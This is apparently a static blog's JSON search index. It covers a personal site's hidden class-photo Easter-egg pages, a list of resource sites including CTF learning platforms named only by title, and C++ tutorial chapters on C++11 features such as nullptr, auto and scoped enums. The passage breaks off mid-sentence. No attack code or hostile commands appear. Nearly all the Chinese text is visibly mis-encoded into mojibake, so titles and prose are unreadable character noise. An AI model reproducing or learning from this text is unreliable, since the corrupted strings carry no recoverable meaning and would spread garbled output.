{"meta":{"title":"Uniqueland","subtitle":"--XsRan's Personal Blog","description":"","author":"XsRan","url":"http://uniqueland.top","root":"/"},"pages":[{"title":"æ¥äº†","date":"2020-11-09T14:06:06.735Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/ToXiaowei.html","permalink":"http://uniqueland.top/Eastereggs/ToXiaowei.html","excerpt":"","text":"http://uniqueland.top/Eastereggs/Class17"},{"title":"Categories","date":"2020-05-10T05:33:34.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"categories/index.html","permalink":"http://uniqueland.top/categories/index.html","excerpt":"","text":""},{"title":"sitemap","date":"2020-05-10T05:34:11.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Sitemap/index.html","permalink":"http://uniqueland.top/Sitemap/index.html","excerpt":"","text":""},{"title":"å…³äº","date":"2020-05-10T05:33:14.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"about/index.html","permalink":"http://uniqueland.top/about/index.html","excerpt":"","text":"ç¬¬ä¸€æ¬¡æ­å»ºç½‘ç«™ä¹Ÿä¸çŸ¥é“åœ¨â€œå…³äºâ€ç‰ˆå—å†™ä»€ä¹ˆï¼Œå°±ç•™ä¸ªå¾®ä¿¡å§ï¼Œæœ‰è·¯è¿‡çš„æƒ³äº¤ä¸ªæœ‹å‹çš„å¯ä»¥åŠ å¾®ä¿¡äº¤æµä¸€ä¸‹ã€‚å¾®ä¿¡IDï¼šKID3317"},{"title":"Schedule","date":"2020-05-10T05:33:53.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"schedule/index.html","permalink":"http://uniqueland.top/schedule/index.html","excerpt":"","text":""},{"title":"","date":"2021-04-24T14:21:13.884Z","updated":"2021-04-24T14:21:13.884Z","comments":true,"path":"hidden/resources.html","permalink":"http://uniqueland.top/hidden/resources.html","excerpt":"","text":"å›¾ç‰‡ç±» Wallhaven Pixabay Pngimg Pexels Unsplash Foodies éŸ³æ•ˆç±» çˆ±ç»™ç½‘ å­—ä½“ç±» å­—ä½“å¤©ä¸‹ çŒ«å•ƒç½‘ æ±‚å­—ä½“ å­—ç”± 100font å¯å•†ç”¨å­—ä½“æŸ¥è¯¢ å½±è§†ç±» çœŸä¸å¡å½±è§† ç‹¬æ’­åº“ 91ç¾å‰§ç½‘ è‰²å½©ç±» colorhunt Coolors Palettable PPTç±» PPTå®è— PPTè¶…çº§å¸‚åœº ä¼˜å“PPT å›¾æ ‡ç±» é˜¿é‡Œå·´å·´çŸ¢é‡å›¾æ ‡åº“ Iconstore æ’ç”»åˆ¶ä½œå·¥å…· è§†é¢‘ç±» Videezy Videvo Mixkit Distill è“å…‰ç½‘ ç»¼åˆç±» Anyknew Topbook"},{"title":"","date":"2022-03-26T11:52:57.162Z","updated":"2022-03-26T11:52:57.162Z","comments":true,"path":"hidden/ctf_resources.html","permalink":"http://uniqueland.top/hidden/ctf_resources.html","excerpt":"","text":"ç†è®ºçŸ¥è¯† CTFHUB çœ‹é›ªçŸ¥è¯†åº“ CheatSheet CTF-WIKI å…ˆçŸ¥ç¤¾åŒº å®‰å…¨å®¢ æ´æ‚‰æ¼æ´ å…ˆçŸ¥ç¤¾åŒº_XXE Freebuf_Web å®è·µå¹³å° BUUCTF æ”»é˜²ä¸–ç•Œ Bugku äºŒè¿›åˆ¶_cy ç»¼åˆ æ¥è‡ªxPointå­¦é•¿çš„åˆ†äº«"},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2021-11-07T15:49:01.532Z","updated":"2020-11-28T16:21:57.445Z","comments":true,"path":"tags/index.html","permalink":"http://uniqueland.top/tags/index.html","excerpt":"","text":""},{"title":"å½©è›‹","date":"2020-11-09T14:06:06.755Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Drafts/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Drafts/Class17.html","excerpt":"","text":"FBI WARNING!éåä¸ƒç­åŒå­¦è¯·é€€å‡ºç½‘é¡µï¼(è™½ç„¶è¯´å…¶ä»–äººä¹Ÿè¿›ä¸æ¥) ç”±äºå±•ç¤ºå›¾ç‰‡è¾ƒå¤šï¼Œå»ºè®®ç­‰å¾…åç§’å†æµè§ˆï¼Œæ•ˆæœæ›´ä½³ã€‚ é•‡æ¥¼ ç™¾æ—¥èª“å¸ˆ é«˜äºŒè¿åŠ¨ä¼š é«˜ä¸‰è¿åŠ¨ä¼š ä¸ªäººç‰¹å†™ å½©è›‹ä¸­çš„å½©è›‹ æ—¥å¸¸ é«˜ä¸€ åˆç…§ å¾…åŠäº‹é¡¹æ”¶é›†æ¯•ä¸šç…§æ‰“åŒ…å›¾ç‰‡ï¼Œæ”¾é“¾æ¥å¾é›†ç½‘é¡µæ–‡æ¡ˆåˆ¶ä½œå­ç½‘â€¦â€¦ç®—äº†æˆ‘å¥½æ‡’â€¦å…³äºæ°´å°ç”±äºåŸå…ˆä½¿ç”¨çš„å›¾åºŠå‡ºç°äº†bugï¼Œå¯¼è‡´éƒ¨åˆ†å›¾ç‰‡åŠ è½½é”™è¯¯ï¼Œæ•…ä¸å¾—ä¸å€Ÿç”¨å¾®åšä½œä¸ºå›¾åºŠã€‚å…³äºå›¾ç‰‡æ•´åˆåŒ…ç”±äºå›¾ç‰‡æ•°é‡è¾ƒå¤šï¼Œæ•…åªæŒ‘é€‰äº†ä¸€äº›è¾ƒå…·æœ‰ä»£è¡¨æ€§çš„å‘å¸ƒã€‚åç»­ä¼šæœ‰ç½‘ç›˜é“¾æ¥ã€‚å˜æ›´è®°å½•changelog2020.05.25 é¦–æ¬¡éƒ¨ç½²2020.05.27 æ›´æ¢ä¸»é¢˜2020.05.28 éƒ¨ç½²è¿‡ç¨‹å‡ºç°é”™è¯¯ï¼Œé‡è£…ç³»ç»Ÿ2020.06.01 è´´å›¾å›¾åºŠå‡ºç°é—®é¢˜ï¼Œæ›´æ¢å›¾åºŠ2020.06.14 å›¾åºŠå†æ¬¡å‡ºç°é—®é¢˜ï¼Œä½¿ç”¨å¾®åšä½œä¸ºä¸´æ—¶å›¾åºŠï¼Œè¡¥å……å›¾ç‰‡"},{"title":"å½©è›‹","date":"2020-11-10T03:26:46.695Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Class17.html","excerpt":"","text":"FBI WARNING!éåä¸ƒç­åŒå­¦è¯·é€€å‡ºç½‘é¡µï¼(è™½ç„¶è¯´å…¶ä»–äººä¹Ÿè¿›ä¸æ¥) ,æ³¨æ„ï¼šæ­¤é“¾æ¥ä¸ºå†…éƒ¨é“¾æ¥ï¼Œæ²¡æœ‰é“¾æ¥çš„äººè¿›ä¸æ¥ï¼Œæ— éœ€æ‹…å¿ƒéšç§æ³„æ¼ã€‚ é•‡æ¥¼ç™¾æ—¥èª“å¸ˆé«˜äºŒè¿åŠ¨ä¼šé«˜ä¸‰è¿åŠ¨ä¼šä¸ªäººç‰¹å†™å½©è›‹ä¸­çš„å½©è›‹æ—¥å¸¸é«˜ä¸€åˆç…§ å…³äºä¸ªäººç…§ç‰‡å¦‚æœ‰å› å„ç§åŸå› è€Œä¸æ„¿æ„å±•ç¤ºå›¾ç‰‡çš„åŒå­¦è¯·ä¸æˆ‘è”ç³»å¦‚æœ‰æƒ³æ·»åŠ å›¾ç‰‡çš„åŒå­¦ä¹Ÿè¯·ä¸æˆ‘è”ç³»ï¼Œä¹æ„è‡³æå¾…åŠäº‹é¡¹æ”¶é›†æ¯•ä¸šç…§æ‰“åŒ…å›¾ç‰‡ï¼Œæ”¾é“¾æ¥å¾é›†ç½‘é¡µæ–‡æ¡ˆåˆ¶ä½œå­ç½‘â€¦â€¦ç®—äº†æˆ‘å¥½æ‡’â€¦ç»ˆç©¶è¿˜æ˜¯é€ƒä¸è¿‡åˆ¶ä½œå­ç½‘é¡µâ€¦ ç”±äºå…ˆå‰åªæœ‰ä¸€ä¸ªç½‘é¡µï¼Œæ•…å›¾ç‰‡å±•ç¤ºæ•°é‡æœ‰é™ã€‚ç°åœ¨â€¦å¢åŠ å­ç½‘é¡µçš„å›¾ç‰‡ç”±äºå›¾åºŠåŸå› æ•…å¾…æ’ç‰ˆå…³äºæ°´å°ç”±äºåŸå…ˆä½¿ç”¨çš„å›¾åºŠå‡ºç°äº†bugï¼Œå¯¼è‡´éƒ¨åˆ†å›¾ç‰‡åŠ è½½é”™è¯¯ï¼Œæ•…ä¸å¾—ä¸å€Ÿç”¨å¾®åšä½œä¸ºå›¾åºŠã€‚å…³äºå›¾ç‰‡æ•´åˆåŒ…ç”±äºå›¾ç‰‡æ•°é‡è¾ƒå¤šï¼Œæ•…åªæŒ‘é€‰äº†ä¸€äº›è¾ƒå…·æœ‰ä»£è¡¨æ€§çš„å‘å¸ƒã€‚åç»­ä¼šæœ‰ç½‘ç›˜é“¾æ¥ã€‚å˜æ›´è®°å½•changelogé¦–æ¬¡éƒ¨ç½²æ›´æ¢ä¸»é¢˜éƒ¨ç½²è¿‡ç¨‹å‡ºç°é”™è¯¯ï¼Œé‡è£…ç³»ç»Ÿè´´å›¾å›¾åºŠå‡ºç°é—®é¢˜ï¼Œæ›´æ¢å›¾åºŠå›¾åºŠå†æ¬¡å‡ºç°é—®é¢˜ï¼Œä½¿ç”¨å¾®åšä½œä¸ºä¸´æ—¶å›¾åºŠï¼Œè¡¥å……å›¾ç‰‡ç”±äºå›¾ç‰‡è¿‡å¤šï¼Œä¸å¾—ä¸åˆ†ä¸ºæ•°ä¸ªå­ç½‘é¡µâ€¦å›¾åºŠå†å†å†æ¬¡å‡ºç°é—®é¢˜ï¼Œæ‰€æœ‰ç½‘é¡µ æ¨ å€’ é‡ åšå†æ¬¡æ’ç‰ˆæ·»åŠ å›¾ç‰‡ï¼Œç•¥ä½œæ’ç‰ˆ"},{"title":"å½©è›‹ä¸­çš„å½©è›‹","date":"2020-11-09T14:06:06.748Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Eastereggs.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Eastereggs.html","excerpt":"","text":"æ—¥å¸¸"},{"title":"ä¸ªäººç‰¹å†™","date":"2020-11-10T05:16:37.169Z","updated":"2020-11-10T05:16:37.168Z","comments":true,"path":"Eastereggs/Class17/Closeup.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Closeup.html","excerpt":"","text":"æ„Ÿè°¢é«˜ä¸­æœ‰ä½ ä»¬ (è°æœ‰ç å§å’Œé©¬è€å¸ˆçš„ç…§ç‰‡æä¾›ä¸€ä¸‹å˜›â€¦å‡‘é½å¬å”¤ç¥é¾™) å½©è›‹ä¸­çš„å½©è›‹"},{"title":"é«˜ä¸€","date":"2020-11-09T14:06:06.751Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade1.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade1.html","excerpt":"","text":"åˆç…§"},{"title":"é«˜äºŒè¿åŠ¨ä¼š","date":"2020-11-09T14:06:06.743Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade2.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade2.html","excerpt":"","text":"!s é«˜ä¸‰è¿åŠ¨ä¼š"},{"title":"é«˜ä¸‰è¿åŠ¨ä¼š","date":"2020-11-09T14:06:06.745Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade3.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade3.html","excerpt":"","text":"ä¸ªäººç‰¹å†™"},{"title":"æ—¥å¸¸","date":"2020-11-09T14:06:06.750Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Routine.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Routine.html","excerpt":"","text":"é«˜ä¸€"},{"title":"é•‡æ¥¼","date":"2020-11-09T14:06:06.741Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Starting.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Starting.html","excerpt":"","text":"ç™¾æ—¥èª“å¸ˆ"},{"title":"","date":"2020-11-10T02:28:15.625Z","updated":"2020-09-28T11:51:06.000Z","comments":true,"path":"Eastereggs/JNU2020/è®°æš¨å¤§æ–°è®­.html","permalink":"http://uniqueland.top/Eastereggs/JNU2020/%E8%AE%B0%E6%9A%A8%E5%A4%A7%E6%96%B0%E8%AE%AD.html","excerpt":"","text":"è®°æš¨å¤§æ–°è®­å¸…æ°”æ˜Šå“¥åœ¨çº¿æ¼”å”± éšæ‹ åœ¨çº¿å¾é›†æ–‡æ¡ˆâ€¦"},{"title":"æˆäººç¤¼ & èª“å¸ˆ","date":"2020-11-09T14:06:06.742Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Oath.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Oath.html","excerpt":"","text":"é«˜äºŒè¿åŠ¨ä¼š"},{"title":"åˆç…§","date":"2020-11-10T05:15:55.270Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Groupphotos.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Groupphotos.html","excerpt":"","text":"èšæ˜¯ä¸€å›¢ç«ï¼Œæ•£æ˜¯æ»¡å¤©æ˜Ÿã€‚åä¸ƒç­çš„å„ä½å…„å¼Ÿå§å¦¹ä»¬ï¼Œæˆ‘ä»¬æœ‰ç¼˜ï¼Œæ±Ÿæ¹–å†è§ï¼ è¿”å›"}],"posts":[{"title":"Chapter 1 C++ Tutorial ç®€ä»‹","slug":"Cpp_tutorial_Chapter_1","date":"2025-04-30T15:45:16.318Z","updated":"2025-04-30T16:01:36.514Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_1/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_1/","excerpt":"","text":"æœ¬ç³»åˆ—æ˜¯å‚è€ƒã€ŠC++ Primer Plusã€‹ç›®å½•è¿›è¡Œç¼–å†™çš„ç²¾ç®€ç‰ˆæ•™ç¨‹ã€‚ ç”±äºæ˜¯ç²¾ç®€ç‰ˆï¼Œå› æ­¤å¯èƒ½ä¸èƒ½å®Œå…¨è¦†ç›–åŸç‰ˆã€ŠC++ Primer Plusã€‹çš„æ‰€æœ‰å†…å®¹ï¼Œä½†æ˜¯åœ¨ç¯‡å¹…ä¸Šå¤§å¤§å‡å°‘ï¼Œåªèƒ½è¯´æœ‰åˆ©æœ‰å¼Šå§ã€‚ å¯¹äºç¼–å†™ä»£ç çš„ç¯å¢ƒï¼Œä¸ªäººå»ºè®®æ˜¯ä½¿ç”¨wsl2ï¼ˆæ¨èï¼‰æˆ–è€…VMWareç­‰è™šæ‹Ÿæœºç¯å¢ƒä¸­Linuxè‡ªå¸¦çš„g++ç¼–è¯‘å™¨ï¼ˆä½¿ç”¨mingwç­‰ç¼–è¯‘å·¥å…·æœ‰å¯èƒ½ä¼šå‡ºç°å„ç§å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯ï¼‰ï¼Œå¸¸è§çš„ç¼–è¯‘å‘½ä»¤å¦‚ä¸‹ï¼š 1g++ test.cpp -o test ç¼–è¯‘å®Œæˆåï¼Œæ‰§è¡Œå‘½ä»¤./testå³å¯è¿è¡Œç¼–è¯‘åçš„ç¨‹åºã€‚ å½“ç„¶ï¼Œä¹Ÿå¯ä»¥çœç•¥-o testï¼Œç›´æ¥ä½¿ç”¨g++ test.cppç¼–è¯‘ï¼Œç¼–è¯‘å®Œæˆåä¼šç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶a.outï¼Œæ‰§è¡Œå‘½ä»¤./a.outå³å¯è¿è¡Œç¼–è¯‘åçš„ç¨‹åºã€‚ æ–‡ç« æœªç»è®¸å¯ç¦æ­¢è½¬è½½ã€‚å¦‚æœ‰é—®é¢˜è¯·å‘é€é‚®ä»¶è‡³xsran12138@163.comã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 18 æ¢è®¨C++æ–°æ ‡å‡†","slug":"Cpp_tutorial_Chapter_18","date":"2025-04-30T15:42:24.030Z","updated":"2025-04-30T15:41:03.856Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_18/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_18/","excerpt":"","text":"18.1 å¤ä¹ å‰é¢ä»‹ç»è¿‡çš„C++11åŠŸèƒ½C++11 æ ‡å‡†ä¸º C++ è¯­è¨€å¸¦æ¥äº†è®¸å¤šé‡è¦çš„æ”¹è¿›å’Œæ–°ç‰¹æ€§ï¼Œæ—¨åœ¨æé«˜è¯­è¨€çš„æ•ˆç‡ã€å®‰å…¨æ€§å’Œæ˜“ç”¨æ€§ã€‚åœ¨å‰é¢çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å·²ç»æ¥è§¦å¹¶ä½¿ç”¨äº†å…¶ä¸­çš„ä¸€äº›åŠŸèƒ½ã€‚æœ¬èŠ‚å°†å¯¹è¿™äº›å·²ä»‹ç»çš„ C++11 ç‰¹æ€§è¿›è¡Œä¸€ä¸ªç®€è¦çš„å›é¡¾ã€‚ 18.1.1 æ–°ç±»å‹C++11 å¼•å…¥äº†å‡ ç§æ–°çš„åŸºæœ¬ç±»å‹ï¼š long long å’Œ unsigned long long: ï¼ˆç¬¬ 3 ç« ï¼‰æä¾›äº†è‡³å°‘ 64 ä½çš„æ•´æ•°ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºæ¯” long æ›´å¤§èŒƒå›´çš„æ•´æ•°ã€‚ 12long long large_num = 9876543210123LL;unsigned long long very_large_positive = 18446744073709551615ULL; char16_t å’Œ char32_t: ï¼ˆç¬¬ 3 ç« , ç¬¬ 16 ç« ï¼‰ç”¨äºæ˜¾å¼æ”¯æŒ UTF-16 å’Œ UTF-32 ç¼–ç çš„å­—ç¬¦ã€‚åˆ†åˆ«ä½¿ç”¨ u å’Œ U å‰ç¼€è¡¨ç¤ºå¯¹åº”çš„å­—ç¬¦å’Œå­—ç¬¦ä¸²å­—é¢é‡ã€‚ 1234char16_t utf16_char = u&#x27;Î©&#x27;;char32_t utf32_char = U&#x27;ğŸŒ&#x27;;const char16_t* utf16_str = u&quot;ä½ å¥½&quot;;const char32_t* utf32_str = U&quot;ä¸–ç•Œ&quot;; nullptr: ï¼ˆç¬¬ 4 ç« ï¼‰å¼•å…¥äº†æ–°çš„ç©ºæŒ‡é’ˆå¸¸é‡ nullptrï¼Œç”¨äºæ›¿ä»£ä¹‹å‰ä½¿ç”¨çš„ 0 æˆ– NULLã€‚nullptr å…·æœ‰æ˜ç¡®çš„æŒ‡é’ˆç±»å‹ (std::nullptr_t)ï¼Œå¯ä»¥é¿å…ä¸€äº›ä¸ 0 (æ•´æ•°) ç›¸å…³çš„æ­§ä¹‰ã€‚ 1234int* ptr1 = nullptr;void (*func_ptr)(int) = nullptr;// if (ptr1 == 0) &#123; /* ... */ &#125; // æ—§å¼æ¯”è¾ƒif (ptr1 == nullptr) &#123; /* ... */ &#125; // C++11 æ¨è 18.1.2 ç»Ÿä¸€çš„åˆå§‹åŒ–C++11 æ¨å¹¿äº†ä½¿ç”¨èŠ±æ‹¬å· &#123;&#125; è¿›è¡Œåˆå§‹åŒ–çš„æ–¹å¼ï¼Œç§°ä¸ºç»Ÿä¸€åˆå§‹åŒ– (Uniform Initialization) æˆ–åˆ—è¡¨åˆå§‹åŒ– (List Initialization)ã€‚è¿™ç§æ–¹å¼å¯ä»¥ç”¨äºå¤šç§åˆå§‹åŒ–åœºæ™¯ï¼Œå¹¶æœ‰åŠ©äºé˜²æ­¢çª„åŒ–è½¬æ¢ (Narrowing Conversion)ã€‚ åŸºæœ¬ç±»å‹: 123int x&#123;5&#125;;double pi&#123;3.14&#125;;// int narrow_error&#123;3.14&#125;; // ç¼–è¯‘é”™è¯¯ï¼é˜²æ­¢ double åˆ° int çš„çª„åŒ– æ•°ç»„: 1int arr[]&#123;1, 2, 3, 4, 5&#125;; // å¤§å°è‡ªåŠ¨æ¨æ–­ ç»“æ„å’Œç±»: 1234struct Point &#123; int x, y; &#125;;Point p&#123;10, 20&#125;;std::string s&#123;&quot;Hello&quot;&#125;; STL å®¹å™¨ (é€šè¿‡ initializer_list): ï¼ˆç¬¬ 16 ç« ï¼‰ 12std::vector&lt;int&gt; v = &#123;1, 2, 3&#125;;std::map&lt;std::string, int&gt; m &#123;&#123;&quot;one&quot;, 1&#125;, &#123;&quot;two&quot;, 2&#125;&#125;; 18.1.3 å£°æ˜C++11 å¼•å…¥äº†æ–°çš„å£°æ˜æ–¹å¼æ¥ç®€åŒ–ç±»å‹ä¹¦å†™å’Œæ¨æ–­ï¼š auto: ï¼ˆç¬¬ 3 ç« ï¼‰è®©ç¼–è¯‘å™¨æ ¹æ®å˜é‡çš„åˆå§‹åŒ–è¡¨è¾¾å¼è‡ªåŠ¨æ¨æ–­å…¶ç±»å‹ã€‚ 1234auto i = 42; // i æ¨æ–­ä¸º intauto d = 3.14; // d æ¨æ–­ä¸º doubleauto s = std::string(&quot;text&quot;); // s æ¨æ–­ä¸º std::stringauto it = v.begin(); // it æ¨æ–­ä¸º std::vector&lt;int&gt;::iterator decltype: æ ¹æ®è¡¨è¾¾å¼æ¨æ–­ç±»å‹ï¼Œä½†ä¸è®¡ç®—è¯¥è¡¨è¾¾å¼ã€‚å¸¸ç”¨äºæ³›å‹ç¼–ç¨‹æˆ–éœ€è¦æ ¹æ®å·²æœ‰å˜é‡æˆ–å‡½æ•°è¿”å›å€¼ç¡®å®šç±»å‹çš„åœºæ™¯ã€‚ 12345int x = 5;decltype(x) y = 10; // y çš„ç±»å‹ä¸ x ç›¸åŒï¼Œä¸º intdouble func();decltype(func()) z; // z çš„ç±»å‹æ˜¯ func çš„è¿”å›ç±»å‹ double (ä¸å®é™…è°ƒç”¨ func) 18.1.4 æ™ºèƒ½æŒ‡é’ˆï¼ˆç¬¬ 16 ç« ï¼‰C++11 åœ¨ &lt;memory&gt; å¤´æ–‡ä»¶ä¸­å¼•å…¥äº†ç°ä»£æ™ºèƒ½æŒ‡é’ˆï¼Œç”¨äºè‡ªåŠ¨ç®¡ç†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå–ä»£äº†å®¹æ˜“å‡ºé”™çš„ auto_ptrã€‚ std::unique_ptr&lt;T&gt;: ç‹¬å æ‰€æœ‰æƒçš„æ™ºèƒ½æŒ‡é’ˆï¼Œè½»é‡çº§ï¼Œä¸å¯å¤åˆ¶ï¼Œå¯ç§»åŠ¨ã€‚ std::shared_ptr&lt;T&gt;: å…±äº«æ‰€æœ‰æƒçš„æ™ºèƒ½æŒ‡é’ˆï¼Œé€šè¿‡å¼•ç”¨è®¡æ•°ç®¡ç†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸã€‚ std::weak_ptr&lt;T&gt;: éæ‹¥æœ‰å‹æŒ‡é’ˆï¼Œç”¨äºè§‚å¯Ÿ shared_ptr ç®¡ç†çš„å¯¹è±¡ï¼Œè§£å†³å¾ªç¯å¼•ç”¨é—®é¢˜ã€‚ 18.1.5 å¼‚å¸¸è§„èŒƒæ–¹é¢çš„ä¿®æ”¹ï¼ˆç¬¬ 15 ç« ï¼‰C++11 å¼•å…¥äº† noexcept è¯´æ˜ç¬¦å’Œè¿ç®—ç¬¦ï¼Œç”¨äºæŒ‡ç¤ºå‡½æ•°æ˜¯å¦å¯èƒ½æŠ›å‡ºå¼‚å¸¸ã€‚ noexcept è¯´æ˜ç¬¦: æ”¾åœ¨å‡½æ•°å£°æ˜æˆ–å®šä¹‰åï¼Œè¡¨ç¤ºè¯¥å‡½æ•°ä¿è¯ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸ã€‚ 1void process_data() noexcept; // å£°æ˜ä¿è¯ä¸æŠ›å¼‚å¸¸ è¿™æœ‰åŠ©äºç¼–è¯‘å™¨è¿›è¡Œä¼˜åŒ–ï¼Œå¹¶ç”¨äºå¼‚å¸¸å®‰å…¨ä¿è¯ã€‚ææ„å‡½æ•°é»˜è®¤æ˜¯ noexcept çš„ã€‚ noexcept è¿ç®—ç¬¦: noexcept(expression)ï¼Œåœ¨ç¼–è¯‘æ—¶åˆ¤æ–­è¡¨è¾¾å¼ expression æ˜¯å¦å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›ä¸€ä¸ª bool å¸¸é‡ã€‚ æ—§çš„ throw() å¼‚å¸¸è§„èŒƒåœ¨ C++11 ä¸­è¢«åºŸå¼ƒã€‚ 18.1.6 ä½œç”¨åŸŸå†…æšä¸¾ï¼ˆç¬¬ 10 ç« ï¼‰C++11 å¼•å…¥äº†å¼ºç±»å‹æšä¸¾ (Strongly-typed enums) æˆ–**ä½œç”¨åŸŸå†…æšä¸¾ (Scoped enums)**ï¼Œä½¿ç”¨ enum class (æˆ– enum struct) å…³é”®å­—å®šä¹‰ã€‚ 12345678910enum class Color &#123; RED, GREEN, BLUE &#125;;enum class Status &#123; OK, ERROR &#125;;Color c = Color::RED;Status s = Status::OK;// if (c == s) &#123;&#125; // ç¼–è¯‘é”™è¯¯ï¼ä¸åŒç±»å‹çš„æšä¸¾ä¸èƒ½ç›´æ¥æ¯”è¾ƒ// int x = c; // ç¼–è¯‘é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ä¸ºæ•´æ•°if (c == Color::GREEN) &#123; /* ... */ &#125; ä¼˜ç‚¹: å¼ºç±»å‹: ä¸åŒæšä¸¾ç±»å‹çš„å€¼ä¸èƒ½éšå¼è½¬æ¢æˆ–ç›´æ¥æ¯”è¾ƒã€‚ ä½œç”¨åŸŸ: æšä¸¾æˆå‘˜çš„ä½œç”¨åŸŸé™å®šåœ¨æšä¸¾ç±»å‹å†…éƒ¨ï¼Œå¿…é¡»é€šè¿‡ EnumType::Member è®¿é—®ï¼Œé¿å…äº†å‘½åå†²çªã€‚ å¯æŒ‡å®šåº•å±‚ç±»å‹: enum class Color : char &#123; RED, GREEN, BLUE &#125;; 18.1.7 å¯¹ç±»çš„ä¿®æ”¹(æœ¬èŠ‚ä¸»è¦å›é¡¾ï¼Œä½†éƒ¨åˆ†å†…å®¹å¦‚å§”æ‰˜/ç»§æ‰¿æ„é€ å‡½æ•°ã€override/final åœ¨ 18.3 è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œä»…æåŠæ¦‚å¿µ)C++11 å¯¹ç±»å®šä¹‰å’Œä½¿ç”¨ä¹Ÿè¿›è¡Œäº†ä¸€äº›æ”¹è¿›ï¼Œéƒ¨åˆ†å·²åœ¨å‰é¢ç« èŠ‚æ¶‰åŠæˆ–å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†ä»‹ç»ï¼Œä¾‹å¦‚ï¼š é»˜è®¤æ„é€ å‡½æ•°å’Œæˆå‘˜åˆå§‹åŒ–: å…è®¸åœ¨ç±»å®šä¹‰ä¸­ç›´æ¥åˆå§‹åŒ–éé™æ€æˆå‘˜å˜é‡ã€‚ = default å’Œ = delete: æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆæ„é€ ã€ææ„ã€æ‹·è´ã€ç§»åŠ¨ï¼‰æˆ–ç¦ç”¨å®ƒä»¬ã€‚ å§”æ‰˜æ„é€ å‡½æ•°: ä¸€ä¸ªæ„é€ å‡½æ•°å¯ä»¥è°ƒç”¨åŒä¸€ç±»çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°ã€‚ ç»§æ‰¿æ„é€ å‡½æ•°: æ´¾ç”Ÿç±»å¯ä»¥ç»§æ‰¿åŸºç±»çš„æ„é€ å‡½æ•°ã€‚ override å’Œ final: ç”¨äºç®¡ç†è™šå‡½æ•°ï¼Œoverride ç¡®ä¿æ´¾ç”Ÿç±»æ–¹æ³•ç¡®å®è¦†ç›–äº†åŸºç±»è™šå‡½æ•°ï¼Œfinal é˜»æ­¢æ´¾ç”Ÿç±»è¿›ä¸€æ­¥è¦†ç›–è™šå‡½æ•°æˆ–é˜»æ­¢ç±»è¢«ç»§æ‰¿ã€‚ 18.1.8 æ¨¡æ¿å’Œ STL æ–¹é¢çš„ä¿®æ”¹C++11 å¯¹æ¨¡æ¿å’Œæ ‡å‡†åº“è¿›è¡Œäº†å¤§é‡å¢å¼ºï¼š åŸºäºèŒƒå›´çš„ for å¾ªç¯: ï¼ˆç¬¬ 5 ç« , ç¬¬ 16 ç« ï¼‰æä¾›äº†ç®€æ´çš„éå†å®¹å™¨æˆ–åºåˆ—çš„æ–¹å¼ã€‚ 1234std::vector&lt;int&gt; v = &#123;1, 2, 3&#125;;for (int x : v) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;;&#125; std::array: ï¼ˆç¬¬ 4 ç« , ç¬¬ 16 ç« ï¼‰æä¾›äº†å›ºå®šå¤§å°æ•°ç»„çš„æ¨¡æ¿ç±»å°è£…ã€‚ æ— åºå…³è”å®¹å™¨: ï¼ˆç¬¬ 16 ç« ï¼‰å¼•å…¥äº†åŸºäºå“ˆå¸Œè¡¨çš„ unordered_set, unordered_map, unordered_multiset, unordered_multimapã€‚ std::initializer_list: ï¼ˆç¬¬ 16 ç« ï¼‰ä½¿å¾—å®¹å™¨å’Œå…¶ä»–ç±»èƒ½å¤Ÿæ”¯æŒä½¿ç”¨ 